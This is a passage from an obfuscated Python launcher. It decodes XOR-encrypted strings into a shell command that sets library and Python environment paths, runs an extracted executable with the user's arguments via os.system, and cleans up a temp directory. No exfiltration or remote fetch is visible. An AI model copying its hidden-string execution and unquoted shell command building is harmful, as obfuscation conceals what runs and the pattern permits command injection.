            242, 244, 160, 204, 196, 223, 204, 201, 194, 210, 193, 210, 217,
            223, 208, 193, 212, 200, 189, 164, 204, 196, 223, 204, 201, 194,
            210, 193, 210, 217, 223, 208, 193, 212, 200, 186, 165, 243, 175,
            236, 233, 226, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244,
            160, 208, 217, 212, 200, 207, 206, 200, 207, 205, 197, 189, 165,
            243, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244, 160, 208,
            217, 212, 200, 207, 206, 223, 197, 216, 197, 195, 213, 212, 193,
            194, 204, 197, 189, 165, 243, 160, 166, 166, 160, 165, 243, 160,
            165, 243]) % (F.prefix, F.prefix, F.executable, I, (lambda x, y:
            D.join(C(A ^ x) for A in y))(33, [1]).join(F.argv[1:]))
        G.system(T)
    except M.BadZipFile:
        J((lambda s: A.join(B(A ^ 206) for A in s))([139, 188, 188, 161, 
            188, 244, 238, 154, 166, 171, 238, 180, 167, 190, 238, 168, 167,
            162, 171, 238, 167, 189, 238, 173, 161, 188, 188, 187, 190, 186,
            171, 170, 238, 161, 188, 238, 160, 161, 186, 238, 175, 238, 180,
            167, 190, 238, 168, 167, 162, 171, 224]))
    except Exception as U:
        J((lambda s: A.join(B(A ^ 195) for A in s))([130, 173, 227, 166, 
            177, 177, 172, 177, 227, 172, 160, 160, 182, 177, 177, 166, 167,
            249, 227, 230, 176]) % U)
    finally:
        P.rmtree(H)


if __name__ == (lambda s: A.join(B(A ^ 30) for A in s))([65, 65, 115, 127, 
    119, 112, 65, 65]):
    b()
